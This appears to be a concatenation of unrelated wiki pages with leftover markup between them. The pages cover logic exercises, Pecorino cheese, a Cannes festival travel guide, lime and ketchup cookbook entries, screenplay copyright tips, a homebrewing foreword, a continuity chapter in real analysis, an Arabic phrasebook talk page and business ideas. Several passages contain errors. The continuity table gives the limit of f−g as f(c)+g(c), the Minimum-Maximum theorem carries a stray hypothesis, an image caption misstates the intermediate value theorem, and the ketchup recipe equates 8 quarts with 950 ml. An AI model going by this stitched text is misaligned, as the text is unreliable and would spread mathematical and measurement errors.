(c) Can you think of a sentence in first order logic that, when added to a knowledge base (and thus considered always true) does the same thing as the = symbol. That is, through it's definition in the knowledge base, this sentence, with 'inputs' x and y, is true if x and y are equal.&lt;br&gt;
(d) The existential quantifier &lt;math&gt; \exists x &lt;/math&gt; defines that a sentence is true if it's true for at least one possible instantiation of x. Can you think of a way to quantify a variable x for a sentence so that the sentence is true if it's true for only one instantiation of x, but no more? You'll probably need the = symbol for this.&lt;br&gt;

'''Pecorino Romano''' is made from sheep's milk. It is straw-white in color. Pecora in Italian means sheep and Pecorino Romano is one of Italy's oldest cheeses. Legend has it that a shepherd filled his flask with sheep's milk before a long trip and the motion during the trip caused the milk to naturally ferment. The idea for a new cheese was born. Today most Pecorino is made in Sardinia, Italy. With its fine flavor Pecorino's popularity as a grating cheese has grown significantly in the U.S. Since sheep only give milk for 6-7 months a year all production must satisfy demand for the entire year.

{{Stub}}

Cannes undoubtedly the biggest film festival of them all.  Over 2 weeks the entire film industry gathers in the French Riveria to buy, sell and develop films.  Even if you are making the most niche eclectic films in the world you cannot consider yourself involved in film if you've not been to Cannes at least once.

==How to get there==

Fly to Nice, (from London Easyjet do cheap fares) and then get the bus or train to Cannes, or rent a car (air-conditioning can be a real need).

One should first be accredited to be allowed to watch the movies in competition or enter the film market space. See external link to the official website in english as to be accredited, that can be done on-line, weeks in advance, usually accrediting would close in april.

You should be able to give an adress where you plan to stay as to be accredited.

Also, one has to know that the main screen projection, in the Festival Palace, only allows men dressed with smoking suits and ladies in  evening dresses. One can rent smoking suits nearby the palace, on Carnot boulevard for instance.

But there is also a lot of screenings in the city during the Festival that allow people in everyday clothes.

Parking in the center of Cannes is a pain in the neck during the Festival. You can park further from the very city center and either walk or take a bus (a quarter to half an hour trip or walk), considering the bus terminal is by the harbour, west end of the Croisette (sea border in town).

Renting an house or flat or an hotel room during the Festival is something expensive, uneasy to do and has to be considered months in advance. Also, one should consider renting in a village or in the country side around Cannes, meaning up to 15 km away, and that can be a one hour trip considering the traffic jam during the film festival.

The weather can be very hot, summerlike, doing the Festival, but it also can be grey, rainy and mid cold. This time of year can be unstable but it would snow only once in a century. Evenings, nights especially, can be a bit cold so you have to take a summer suit as well as a jumper and a raincoat or umbrella. It usually rains one day or so during the week. Don't consider bathing unless you like cold water. But most of the time, evening would be great to have dinner and partying outside. Enjoy !

'''Limes''' are sour green [[Cookbook:Citrus|citrus]] [[Cookbook:Fruit|fruit]]. Limes may be substituted for [[Cookbook:Lemon|lemons]], and lime juice for [[Cookbook:Lemon Juice|lemon juice]].
The outermost surface contains flavorful oils that may be scraped off with a [[Cookbook:Zester|zester]], [[Cookbook:Knife|serrated knife]], or [[Cookbook:Grater|grater]]. As with other citrus fruit, slices are often used to decorate drinks.

The common '''Persian lime''' or '''Tahitian lime''' is a relatively small and thin-skinned citrus fruit. The '''Bearss''' variety, a type of Tahitian lime, is seedless and a bit smaller than the Persian variety. The '''Key lime''', also known as the '''Mexican lime''' or '''bartender's lime''', is much smaller and has an even thinner skin.

'''Ketchup''', also known as '''catsup''', is a type of [[Cookbook:Sauces|sauce]] containing [[Cookbook:Spices|spices]] and a large amount of acid ([[Cookbook:Vinegar|vinegar]] or lactic acid), typically [[Cookbook:Tomato|tomato]]-based. Some recipes, particularly those from [[Cookbook:Cuisine of Australia|Australia]], may use the ambiguous term [[Cookbook:Tomato Sauce|tomato sauce]] to mean tomato ketchup.

Ketchup is commonly used on [[Cookbook:Deep Fat Frying|deep fat fried]] foods, [[Cookbook:Meat|meat]], and  [[Cookbook:Egg|eggs]]. Ketchup is normally applied at the table as a condiment, but it is also commonly used as an ingredient for [[Cookbook:Meatloaf|meatloaf]] and [[Cookbook:Barbecue Sauce|barbecue sauce]].

Interestingly, the original ketchup did not include tomatoes. It was probably a Chinese sauce called &quot;ke-tsiap&quot;, based on [[Cookbook:Fermentation|fermented]] [[Cookbook:Brining|brined]] fish or shellfish. The sauce was brought back to Europe by sailors, and appropriated into local recipes. Later, tomatoes were added.

==Ingredients==

* 8 [[Cookbook:Quart|quarts]] (950 [[Cookbook:ML|ml]]) [[Cookbook:Tomato|tomatoes]]
* 1/2 [[Cookbook:Cup|cup]] (120[[Cookbook:Gram|g]]) [[Cookbook:Sugar|sugar]]
* 2 [[Cookbook:Tablespoon|tablespoons]] dry [[Cookbook:Mustard|mustard]]
* 1 tablespoon ground [[Cookbook:Allspice|allspice]]
* 2 cups [[Cookbook:Cider vinegar|cider vinegar]]
* 3 tablespoons [[Cookbook:Salt|salt]]
* 1 tablespoon [[Cookbook:Pepper|black pepper]]
* 1 [[Cookbook:Teaspoon|teaspoon]] ground [[Cookbook:Clove|cloves]]

==Procedure==
Select good, ripe tomatoes. Scald and strain through a coarse sieve to remove seed and skin. Measure 1 gallon (3.8 litres). When the tomatoes become cold add the remaining ingredients. Let simmer slowly for 3 hours. Pour into hot sterilized 1-pint jars and seal. Process for 15 minutes in boiling water bath. Add 5 minutes processing time for altitudes from 1,001 to 6,000 feet (300 - 1800 metres), and another 5 minutes if over 6,000 feet (1800 metres).

It is not possible to copyright an ''idea'' - you only get copyright in the '''expression of the idea''' eg the script, the film or even the synopsis.

Screenwriters can sometimes be overly paranoid that someone else will steal their ideas.  The U.S. Copyright Office[http://www.copyright.gov] offers one way to ensure your copyrights are protected for life, for a fee $45. Another way is to register your script with a script registration service, like the [http://www.wgawregistry.org/ Writer's Guild of America Registry]. 

Depending on your country of origin, there is also the [[w:poor man's copyright|poor man's copyright]]. This action of mailing your material to yourself is not necessarily admissible in a United States court of law, as it is easily spoofed; however, in many European countries it may or may not be admissible, but will most likely be accepted with some form of &quot;recorded delivery&quot;, as opposed to regular mail. In any case, if you fear your intellectual property may be stolen, it is well worth the money to register it with local copyright officials.

Another suitable means of protecting your work is to use a [[w:Notary_public|notary service]] (available at most banks). You can have the notary date and sign your documents to serve as a proof if your work is ever stolen.

See the section on [[Movie Making Manual/Copyright|Copyright]] for more information.

Beer making has a long and varied history through out the world. From individuals making a couple of cases at home in the kitchen to large industrial sites that produce hundreds of cases per hour. That you want to home brew says that you have tried a couple of different beers and thought you would like to taste something different, or that you could do better. Don't worry! Homebrewing isn't that hard. It does require patience and some attention to detail. But don't stress out. As a sage once put it: &lt;b&gt;Relax, Don't worry, have a homebrew!&lt;/b&gt;

Below you will find a collection of articles discussing the different aspects to homebrewing. Feel free to look through them.

== Foreword to the Student ==

Welcome to the world of home beer brewing! This wikibook aims to help you, the student, become a well rounded and versed master home brewer. It is recommended that you use this book as part of a class led by an experienced instructor, who can lead you through the book and assist you in practical application of the information contained therein. However, determined students will certainly be able to use this material to be their own instructor, and in such case, you should probably read the instructor foreword. Beer brewing is an exciting and mind opening process, and will allow you to refine your tastes for beer by better understanding the hows, the whys, and the history of beer production.

== Foreword to the Instructor ==

As an instructor, you are carrying on an ancient tradition. It is imperative that you impart your charge with as much appreciation and as much enthusiasm for beer making as you should have. This book aims to be a complete discourse on the entire beer making process, and to avoid repeating identical material it has been organized in a &quot;grain to stein&quot; fashion. Unfortunately, this organization will prove to push too much information too soon to entice a beginner and get him on the road to making a quality beer.

So, for the instructor (and students instructing themselves), here is a recommended path through this book: [[/Cleaning/Sanitization/]], [[/Procedures/]], [[/Equipment/]], [[/Boiling/]], [[/Cooling/]], [[/Fermentation/]], [[/Bottling/Kegging/]], [[/Ingredients/]], [[/Mashing/]], [[/Lautering/]], Cultivation, Malting. It is assumed that this path will be accompanied with relevant lectures and exercises, to reinforce the material and affect a better understanding. For the self instructing brewer, we recommend that you follow this path, reading at least to the point of fermentation before performing your first &quot;brew-day,&quot; while paying attention to procedures relating to ''extract brewing''. Once you have pitched yeast, you will have at least 2 weeks to read the bottling/kegging section, and decide how you intend to finish your beer. Natural bottle carbonation is the least expensive way, but it is also the easiest with which to make mistakes resulting in sub-standard beer (or exploding bottles, which is fun). A kegging system is quite an investment, especially for first timers who may find that homebrewing is not the hobby for them, but it is the most straight forward method, often producing a more consistent quality beer.

Once the self instructing student has become comfortable with the simplified process using extract, we recommend he continue learning about the rest of the process and at least try to produce an &quot;all-grain&quot; brew. Little additional equipment required, while the resulting beer can be several orders of quality and freshness better than an extract brew from comparable initial ingredients, not to mention that per-batch costs can even go down.

{{TOC|limit=3|float=right}}

Now that we've defined the limit of a function, we're in a position to define what it means for a function to be continuous. The notion of '''Continuity''' captures the intuitive picture of a function &quot;having no sudden jumps or oscillations&quot;. We will see several examples of discontinuous functions that illustrate the meaning of the definition. The idea of continuous functions is found in several areas of mathematics, apart from real analysis. 

==Definition==
Let &lt;math&gt;A\subseteq\mathbb{R}&lt;/math&gt;&lt;br /&gt;
Let &lt;math&gt;f:A\to\mathbb{R}&lt;/math&gt;&lt;br /&gt;
Let &lt;math&gt;c\in A&lt;/math&gt;&lt;br /&gt;

We say that &lt;math&gt;f(x)&lt;/math&gt; is continuous at &lt;math&gt;c&lt;/math&gt; if and only if&lt;br /&gt; 
For every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that &lt;math&gt;|x-c|&lt;\delta\implies |f(x)-f(c)|&lt;\varepsilon&lt;/math&gt;.&lt;br /&gt;
We say &lt;math&gt;f&lt;/math&gt; itself is continuous if this condition holds for all points in &lt;math&gt;A&lt;/math&gt;.&lt;br /&gt;

If &lt;math&gt;A&lt;/math&gt; is a union of intervals, the statement is equivalent to saying that &lt;math&gt;\lim_{x\to c}f(x)=f(c)&lt;/math&gt;.

==Operations==
Since limits are preserved under algebraic operations, let's check whether this is also the case with continuity.

===Algebraic===
We see that if &lt;math&gt;f(x)&lt;/math&gt; and &lt;math&gt;g(x)&lt;/math&gt; are both continuous at c, continuity still works out fine for the following situations:

{| class=&quot;wikitable&quot;
|+ List of Continuous Functions that are Preserved Under Algebraic Operations
|-
! Addition
| &lt;math&gt;\lim_{x \rightarrow c}{(f+g)(x)} =  f(c) + g(c)&lt;/math&gt;
|-
! Subtraction
| &lt;math&gt;\lim_{x \rightarrow c}{(f-g)(x)} =  f(c) + g(c)&lt;/math&gt;
|-
! Product
| &lt;math&gt;\lim_{x \rightarrow c}{(f \cdot g)(x)} =  f(c) \cdot g(c)&lt;/math&gt;
|-
! Multiple of a Function
| &lt;math&gt;\lim_{x \rightarrow c}{\lambda \cdot g(x)} = \lambda \cdot g(c)&lt;/math&gt;
|-
! Reciprocal
| &lt;math&gt;\lim_{x \rightarrow c}{\left( \dfrac{1}{g} \right)(x)} = \dfrac{1}{g(c)}&lt;/math&gt;
|-
! Division
| &lt;math&gt;\lim_{x \rightarrow c}{\left( \dfrac{f}{g} \right)(x)} = \dfrac{f(c)}{g(c)}&lt;/math&gt;
|}

Note that of course, for any division, g(c) must be a valid number i.e. not 0.

This is actually a corollary when you look at the proofs for the preservation of algebraic operation for limits. Simply replace the limit values ''L'' and ''M'' with ƒ(c) and g(c) respectively.

We can use sequential limits to prove that functions are discontinuous as follows:

* &lt;math&gt;f(x)&lt;/math&gt; is discontinuous at &lt;math&gt;c&lt;/math&gt; if and only if there are two sequences &lt;math&gt;(x_n)\rightarrow c&lt;/math&gt; and &lt;math&gt;(y_n)\rightarrow c&lt;/math&gt; such that &lt;math&gt; \lim_{n \rightarrow \infty}(f(x_n)) \not= \lim_{n \rightarrow \infty}(f(y_n))&lt;/math&gt;.

===Composition===
Composition is a lot trickier though, as always.

{{Sample|caption=Theorem|sampletext=If &lt;math&gt;f:B\rightarrow \mathbb{R}&lt;/math&gt; and &lt;math&gt;g:A\rightarrow B&lt;/math&gt; are continuous, then the composition &lt;math&gt;(f \circ g)(x) = f(g(x))&lt;/math&gt; is continuous on A.}}

{| style=&quot;margin: 1em auto 1em auto;&quot;
|+ '''Proof that Composition works for Continuous Functions at c'''
|-
| Let &lt;math&gt;\epsilon &gt; 0&lt;/math&gt;
|-
| Since f is continuous, &lt;math&gt;\exists \delta_1 &gt; 0: |x-c|&lt;\delta_1 \implies |f(x)-f(c)|&lt;\epsilon&lt;/math&gt;. 
|-
| Since g is continuous, &lt;math&gt;\exists \delta_2 &gt; 0: |x-c|&lt;\delta_2 \implies |g(x)-g(c)|&lt;\delta_1&lt;/math&gt;. 
|-
| Thus &lt;math&gt;|x-c|&lt;\delta_2 \implies |g(x)-g(c)|&lt;\delta_1 \implies |f(g(x))-f(g(c))|&lt;\epsilon&lt;/math&gt;, so &lt;math&gt;(f \circ g)(x)&lt;/math&gt; is continuous on A.
|-
| style=&quot;align:right;&quot; | &lt;math&gt;\square&lt;/math&gt;
|}

But, it still works too, under continuity.

==The Three Continuity Theorems==
Think about what an intuitive notion of continuity is. If you can’t the image of a polynomial function always works. The smooth curve as it travels through the domain of the function is a graphical representation of continuity. However, how do we mathematically know that it’s continuous? Well, we’ll start with the Three Continuity Theorems that will verify this notion.

===The Intermediate Value Theorem===
This is the big theorem on continuity.  Essentially it says that continuous functions have no sudden jumps or breaks.  

{{TextBox|'''Theorem'''&lt;hr/&gt;Let f(x) be a continuous function.  If &lt;math&gt;a&lt;b&lt;/math&gt; and &lt;math&gt;f(a)&lt;m&lt;f(b)&lt;/math&gt;, then &lt;math&gt;\exists c \in (a,b):  f(c) = m&lt;/math&gt;.}}

[[File:Intermediatevaluetheorem.svg|alt=The typical depiction of the intermediate value theorem with one peak and one valley.|thumb|The intermediate value theorem: Given a continuous function on [a,b] and three variables a &lt; c &lt; b it must be the case that ƒ(a) &lt; ƒ(c) &lt; ƒ(b)]]

====Proof====
Let &lt;math&gt;S = \{x \in (a,b): f(x) &lt; m\}&lt;/math&gt;, and let &lt;math&gt;c = \sup S&lt;/math&gt;.  

Let &lt;math&gt;\epsilon = |f(c) - m|&lt;/math&gt;.  By continuity, &lt;math&gt;\exists \delta: |x-c|&lt; \delta \implies |f(x)-f(c)|&lt; \epsilon &lt;/math&gt;.

If f(c) &lt; m, then &lt;math&gt;|f(c+\frac{\delta}{2}) - f(c)| &lt; \epsilon&lt;/math&gt;, so &lt;math&gt; f(c+\frac{\delta}{2}) &lt; f(c) + \epsilon = m &lt;/math&gt;.  But then &lt;math&gt;c + \frac{\delta}{2} \in S&lt;/math&gt;, which implies that c is not an upper bound for S, a contradiction.

If f(c) &gt; m, then since &lt;math&gt;c = \sup S&lt;/math&gt;, &lt;math&gt;\exists x: x \in S, c&gt;x&gt;c-\delta&lt;/math&gt;.  But since &lt;math&gt;|x-c|&lt;\delta&lt;/math&gt;, &lt;math&gt;|f(x)-f(c)|&lt;\epsilon&lt;/math&gt;, so &lt;math&gt;f(x)&gt; f(c) - \epsilon&lt;/math&gt; = m, which implies that &lt;math&gt;x \notin S&lt;/math&gt;, a contradiction. &lt;math&gt;\Box&lt;/math&gt;

We will now prove the Minimum-Maximum theorem, which is another significant result that is related to continuity. Essentially, it states that any continuous image of a closed interval is bounded, and also that it attains these bounds.

===Minimum-Maximum Theorem===
This theorem functions as a first part in another bigger theorem. However, on its own, it helps bridge the gap between supremums and infimums in regards to functions.

{{TextBox|'''Theorem'''&lt;hr/&gt;Given a continuous function ƒ on [a,b] i.e. &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;, if &lt;math&gt;a&lt;b&lt;/math&gt; and &lt;math&gt;f(a)&lt;m&lt;f(b)&lt;/math&gt;, then &lt;math&gt;f([a,b])&lt;/math&gt; is bounded.}}

[[Image:minimum-maximum theorem.png|thumb|right|350px]]

====Proof====
Assume if possible that &lt;math&gt;f&lt;/math&gt; is unbounded. 

Let &lt;math&gt;x_1=\tfrac{a+b}{2}&lt;/math&gt;. Then, &lt;math&gt;f&lt;/math&gt; is unbounded on at least one of the closed intervals &lt;math&gt;[a,x_1]&lt;/math&gt; and &lt;math&gt;[x_1,b]&lt;/math&gt; (for otherwise, &lt;math&gt;f&lt;/math&gt; would be bounded on &lt;math&gt;[a,b]&lt;/math&gt; contradicting the assumption). Call this interval &lt;math&gt;I_1&lt;/math&gt;.

Similarly, partition &lt;math&gt;I_1&lt;/math&gt; into two closed intervals and let &lt;math&gt;I_2&lt;/math&gt; be the one on which &lt;math&gt;f&lt;/math&gt; is unbounded.

Thus we have a sequence of nested closed intervals &lt;math&gt;[a,b]\supseteq I_1\supseteq I_2\supseteq\ldots&lt;/math&gt; such that &lt;math&gt;f&lt;/math&gt; is unbounded on each of them. 

We know that the intersection of a sequence of nested closed intervals is nonempty. Hence, let &lt;math&gt;x_0\in I_1\cap I_2\cap\ldots&lt;/math&gt;

As &lt;math&gt;f(x)&lt;/math&gt; is continuous at &lt;math&gt;x=x_0&lt;/math&gt;, there exists &lt;math&gt;\delta &gt;0&lt;/math&gt; such that &lt;math&gt;x\in V_{\delta}(x_0)\implies f(x)\in (f(x_0)-1,f(x_0)+1)&lt;/math&gt; But by definition, there always exists &lt;math&gt;k\in\mathbb{N}&lt;/math&gt; such that &lt;math&gt;I_k\subseteq V_{\delta}(x_0)&lt;/math&gt;, contradicting the assumption that &lt;math&gt;f&lt;/math&gt; is unbounded over &lt;math&gt;I_k&lt;/math&gt;. Thus, &lt;math&gt;f&lt;/math&gt; is bounded over &lt;math&gt;[a,b]&lt;/math&gt;

===Extreme Value Theorem===
This is the second part of the theorem. It is the more assertive version of the previous theorem, stating that not only is there a supremum and a infimum, it also is reachable by the function ƒ and will be in between the interval you specified.

{{TextBox|'''Theorem'''&lt;hr/&gt;Given a continuous function ƒ on [a,b] i.e. &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;, if &lt;math&gt;M,m&lt;/math&gt; are respectively the upper and lower bounds of &lt;math&gt;f([a,b])&lt;/math&gt;, then there exist &lt;math&gt;c,d\in [a,b]&lt;/math&gt; such that &lt;math&gt;f(c)=M,f(d)=m&lt;/math&gt;.}}

[[File:Extreme Value Theorem.svg|alt=The typical depiction of continuity: a function with one peak and one valley. f at c and f at d is marked|thumb|A depiction of the Extreme Value Theorem: Given a continuous function on [a,b], there must exist a maximum c and d such that ƒ(c) is the greatest value in the interval and ƒ(d) is the littlest.]]

====Proof====
Assume if possible, &lt;math&gt;M=\sup (f([a,b]))&lt;/math&gt; but &lt;math&gt;M\notin f([a,b])&lt;/math&gt;.

Consider the function &lt;math&gt;g(x)=\frac{1}{M-f(x)}&lt;/math&gt;. By algebraic properties of continuity, &lt;math&gt;g:[a,b]\to\mathbb{R}&lt;/math&gt; is continuous. However, &lt;math&gt;M&lt;/math&gt; being a cluster point of &lt;math&gt;f([a,b])&lt;/math&gt;, &lt;math&gt;g(x)&lt;/math&gt; is unbounded over &lt;math&gt;[a,b&lt;/math&gt;, contradicting (i). Hence, &lt;math&gt;M\in f([a,b])&lt;/math&gt;. Similarly, we can show that &lt;math&gt;m\in f([a,b])&lt;/math&gt;.

==Appendix==
Continuity will come again in other branches in mathematics. You will come across not only different variations of continuity, but you will also come across different definitions of continuity too.

===Uniform Continuity===
Let &lt;math&gt;A\subseteq\mathbb{R}&lt;/math&gt;&lt;br /&gt;
Let &lt;math&gt;f:A\to\mathbb{R}&lt;/math&gt;&lt;br /&gt;

We say that &lt;math&gt;f&lt;/math&gt; is '''Uniformly Continuous''' on &lt;math&gt;A&lt;/math&gt; if and only if for every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt; there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that if &lt;math&gt;x,y\in A&lt;/math&gt; and &lt;math&gt;|x-y|&lt;\delta&lt;/math&gt; then &lt;math&gt;|f(x)-f(y)|&lt;\varepsilon&lt;/math&gt;

===Lipschitz continuity===
Let &lt;math&gt;A\subseteq\mathbb{R}&lt;/math&gt;&lt;br /&gt;
Let &lt;math&gt;f:A\to\mathbb{R}&lt;/math&gt;&lt;br /&gt;

We say that &lt;math&gt;f&lt;/math&gt; is '''Lipschitz continuous''' on &lt;math&gt;A&lt;/math&gt; if and only if there exists a positive real constant &lt;math&gt;K&lt;/math&gt; such that, for all &lt;math&gt;x,y\in A&lt;/math&gt;, &lt;math&gt;|f(x)-f(y)| \le K |x-y| &lt;/math&gt;.

The smallest such &lt;math&gt;K&lt;/math&gt; is called the ''Lipschitz constant'' of the function &lt;math&gt;f&lt;/math&gt;.

===Topological Continuity===
As mentioned, the idea of continuous functions is used in several areas of mathematics, most notably in [[Topology]]. A different characterization of continuity is useful in such scenarios. 

===Theorem===
Let &lt;math&gt;A\subseteq\mathbb{R}&lt;/math&gt;&lt;br /&gt;
Let &lt;math&gt;f:A\to\mathbb{R}&lt;/math&gt;&lt;br /&gt;

&lt;math&gt;f(x)&lt;/math&gt; is continuous at &lt;math&gt;x=c&lt;/math&gt; if and only if for every open neighbourhood &lt;math&gt;V&lt;/math&gt; of &lt;math&gt;f(x)&lt;/math&gt;, there exists an open neighbourhood &lt;math&gt;U&lt;/math&gt; of &lt;math&gt;x&lt;/math&gt; such that &lt;math&gt;U\subseteq f^{-1}(V)&lt;/math&gt;

It must be mentioned here that the term &quot;Open Set&quot; can be defined in much more general settings than the set of reals or even metric spaces, and hence the utility of this characterization.</text>

==New Ideas==
Here are some possible catagories I would like to propose.

# I don't understand.
# Important sentences for tourists wanting information. (questions and answers)
# How are you, Meeting and greeting people.
# Polite expressions
# Accepting and giving gifts.
# Buying somehting (asking for a lower price, etc)
# Asking for things you want.
# Food preferences. Refusing food, and giving reasons.
# Talking about language capabilities.
# Talking about where you learnt Arabic, etc.
# Talking about what grade you are in. Or what school you go to. How long you have been there, How long you will stay.
# Talking about what you are doing (I am visiting, I am on vacation)
# Talk about occupation, and maritial status, Where one is from, etc.
# Apologizing
# Camera, am I allowed to take a picture, can you take this picture for me, etc.
# Talking on the telephone

I also think, that people who have no knowledge of Arabic, should add phrases to proper catagories. Later on others can translate them, and give information on meaning.

==Major addition ==

Added:
*some phrases (all are from MSA)
*word by word transliteration (made it less ambigous)
*syllable by syllable transliteration

I added some phrases. Including two words understood, but rarely used in the arabic of today (كلا and بلى). All additions are MSA as far as I can see.
I improved the method of transliteration. I added curly brackets to distinguish digraphs even-though this method seems clumsy to me. 
The syllable by syllable transliteration should be very useful for beginners. There are different ways that such phrases could be broken into syllables. I included the most correct way. Perhaps, the other ways will be added later, to improve listening comprehension.


A few questions ought to be answered:
# What is the exact purpose of the &quot;Arabic Basic Phrases&quot; page?
# Is it living up to the purpose?
# Is this page in the right place?
# Does unilang have editable phrasebook pages, such as this one?


I think there is a need for :
*Arabic phrase pages for each dialect
*One phrase repository for phrases that are common to all arabic
*One that introduces simpler phrases, and then more complex ones.
*One that has phrases sorted by in what situation they are used.
*Word by word translation of each word in sequence.

ex.    It should be done like this: 
 الولد       فعل            شيء      
                did          the                &lt;---Top translation line
 thing                    boy                   &lt;---Bottom translation line
 Transliteration: al-waladu fa`ala shay'an.
 (S) Translit.: al-wa-la-du-fa-`a-la-shay-an
 Translation: The boy did something.
 Notes:  &lt;Notes go here, about usage, what it means, grammar, etc.&gt;

      
Notice how &quot;the&quot; lines up with ال because their function is similar. This might require the use of tables. Letters that attach to a word have translations that go on the top translation line, while the main meaning of the word goes on the bottom one.

I'll add some more phrases later.

== Changes in appearance ==
I greatly appreciate your work on Arabic, because Arabic is a language that always thrilled me. I am really happy of being able to help you on it, and I hope you like my changes :-)
However, if you think the letters are a bit too big (I wanted them to be easilly readable) just post it here and I'd be happy to change it. Or simply change &lt;code&gt;&lt;nowiki&gt;&lt;font size=&quot;+3&quot;&gt;&lt;/nowiki&gt;&lt;/code&gt; to whatever suits best.&lt;BR&gt;
Please, please continue your work on it, and try to add more information. It's really interesting! :-)&lt;BR&gt;
Oh, and, by the way, you can use &lt;code&gt;&lt;nowiki&gt;&lt;BR&gt;&lt;/nowiki&gt;&lt;/code&gt; to change lines --seems you missed it ;-)&lt;BR&gt;

We could also move this page to a more appropriate name, such as [[Arabic:Basic Phrases]], so as to maintain some order in this wiki :-)

Oh, and, for anyone interested, I believe [[http://www.shariahprogram.ca/Arabic-alphabet.shtml Course on Arabic alphabet]] has lots of information on how to read and write, free of charge.&lt;BR&gt;
--[[User:Wizard0|Wizard0]] 22:36, 19 Feb 2005 (UTC)

== Pronunciation ==

Isn't there a standard way of writing Arabic pronounciation in the latin alphabet?  If there is, it might be a good idea to use it instead of doing it phrasebook-style -- [[User:Kowey|Kowey]] 13:53, 28 Mar 2005 (UTC)




Moved from page: '''This were some of the basic phrases in arabic, i wrote the pronunciation in normal english to make it comprehensible by any student of any age, sorry the page is a bit messy and misses a lot but i am new to wikibooks, and i am still getting used to the editor...'''

==Age==

I don't know how to type in Arabic but there is a mistake - the correct way to ask one's age is not &quot;Cam Umrak?&quot; but &quot;Qadeish Umrak?&quot;
:Bet you aren't a native speaker, Kam Umrak? is a standard Arabic phrase that is quite understandable anywhere in the Arab World. The other variant you proposed is a one in the local dialect of Bilad Al Shaam (Palestine, Jordan, Lebanon, and Syria). Please keep it as it is.[[User:195.229.241.182|195.229.241.182]]</text>

      <text xml:space="preserve">Have you ever had a great idea for a business but you haven't got the time to get it off the ground?  Well, here's a good place for us to collect our ideas so - hopefully - some kind person will make our lives easier (and make loads of money) by taking up the idea.

If you already know of a business which serves one of these ideas then please make a note of this on the relevant page.

=Communications=
==Web-based SMS service==
We all need to send [[w:Short_message_service|SMS messages]].  But it's a real pain doing it from the handset of your phone.  So why isn't there a decent web-based [[w:Short_message_service|SMS messages]] service?  Sure, there are some out there, but they're all crap.

It would be really cool if you could send [[w:Short_message_service|SMS messages]] messages from your email client.

I have done a fair amount of research into this idea, but had to shelve it due to other employment commitments and lack of finance. The basic concept is to recive ordinary email which the sender want's relayed to a physical mailing address. The destination address is placed in the subject field of the email so it can be filtered out for printing of envelopes. I called my service &quot;Wemail&quot;

The company acts as a mediating service. The emails are recieved and collated, translated perhaps into postscript and spooled for printing. There are many large companies that allready exist which handle bulk mailing services, and they could be a outsourced to handle large mail runs on the apropriate scale, sending large numbers of mail to different destination addresses.

The only tweaking needed would be to make arangements with mailing service, so that they can handle the printing and collating of letters which have individual contents. I'm sure it can all be done. You set up a website with Information, payment systems, and disclaimers. A customer can register for some credit say 20 virtual stamps, you charge a nominal amount allowing for profit. The customer can then write a letter using their normal email system, and it will be sent to the destination of a normal street address via snail-mail.

=Environment &amp; Wood products=
Greenpeace should get into the timber industry, and charge a premium for wood from well managed forest &amp; sell to their environmental buddies.

=Time Management=
A combination of a journal and a calendar. This would say the date and time when ever you write in it. It would also show previous entries, so that if you write in it January 2nd, you would see all of your other January 2nd entries. You would open it up and just start typing and it would automatically enter the date and time. It would have 365 pages (one for each day), and it would put entries for each year on the same page.

I think this would be cool because it would help you get a sense of progress, as you compared what you were doing the previous years on the same day.

=Computers=
==Battle Field of Ideas--A Wiki based computer game==

We should create a system where ideas can compete in a survival of the fittest-tournament. 

We could use this website. We would start by letting the popularity of different ideas be used as the strength of an online role-playing-game’s character. Much like [Everquest]'http://en.wikipedia.org/wiki/Everquest'. I would call the game, battle field of ideas? Why would I do this? Because I believe that we should create a system where ideas can compete. This would be a way that people would be interested in the success of an idea.

For example, any of the suggestions on this web site would work. A game player would go looking for the idea that he thought was the best. Then he would try and convince as many people as he could to agree with him, during the duration of the game… Maybe a tournament would last a couple of months.

To accomplish this, first you have a web page where people debate issues. Then you track the popularity of a couple hundred different particular ideas. These popularities will be represented by the percentage of people who agree or disagree with that issue. 

You then let these percentages represent different characteristics of a particular character in a role-playing game. 

For example, this game would work much like [Everquest] [an online multiplayer computer game -Ed.] However in Ever-quest characters have different pre-programmed strengths. In this game, maybe once a day, your game would download the strengths for your character from our database. 

Why would I want to build this game and why would people want to play it? 

I would like you to ask me why, and I’ll try to respond, however I’ll explain a little bit more here. 

This web site would be ½ discussion board, ½ video game. I’ve been thinking a lot about evolution. Businesses and species evolve because they allow for a system of survival of the fittest. We need to come up with a system where ideas can compete. To do this we should track idea’s popularity over time, much like stocks are tracked. We should also make people want to be involved in the war of ideas. So why not make a video game out of it? However I am bringing up lots of different issues, and we should just do one at a time…

=Electronics=1.0
I would like to discuss the possibility of developing an electronic textbook for our school childern. This single unit would contain all the text books for a set grade and remove a lot of weight from students backpacks. I would also enhance the security of our schools by removing a large bulky space in which something can be hidden.  I'll keep an eye out for anyone interested in this discussion.

==A CD player that will play the separate parts of songs.==
You could control the levels of each track of the different instruments with any given song.

Reason to Agree

Amature Musicians would pay to be able to hear just one part of a song isolated from the whole, so they could learn that part. Record CD's, and build CD players that will maintain the separate tracks from the original recording. Example: Vocals, lead guiter, bass, clap track, etc. Ideas: This should be simple. The technology already exists, however it needs to transition from studio/home recording equipment into a component which fits nice and snug with the DVD player, reciever, etc. Why: This would be of special benefit to those who are interested in trying to play an instrument. Principal: Empower future musicians. Let them take control of the music that they listen prefer to learn from and allow them isolate the tracks for ease of learning.  It would follow that the source CD compnent could export out the individual tracks for editing and remixing.

=Transport=

==GPS map wiki==
GPS map wiki for satellite navigation - Most of the GPS maps used for car sat nav systems get out of date very quickly.  So why not apply the wiki concept to GPS maps?

GPS maps used in car sat nav systems get out of date very quickly as the roads develop.  So what better way to update the maps than with a wiki system?  If you, as a driver, find an error in the map then you can submit a change using a very simple interface on the map system.  This wiki idea could also be applied to the mapping of speed cameras, restaurants etc.

A [http://visual.wiki.taoriver.net/moin.cgi/EarthMapTool wiki on building new maps] and [http://visual.wiki.taoriver.net/moin.cgi/EarthMap online maps] already exists, but I wish it were easier for individuals to make small corrections to maps.
[http://wikitravel.org/en/Wikitravel:Mapmaking_Expedition Other wiki] would benefit a lot from wiki-like map updates.

==Giving Bus location info by SMS.==  

The most frustrating thing about catching the bus is not knowing how long it will be until the next one comes.  Sometimes it might be quicker walking, or catching a bus other than the one you usually wait for. The bus LED Bus schedule screens in the UK are expensive (prohibitively so I suspect), often out of order and have proven prone to vandalism. This could be easily solved by putting a GPS tracker in all the buses and linking them up to a cental database.

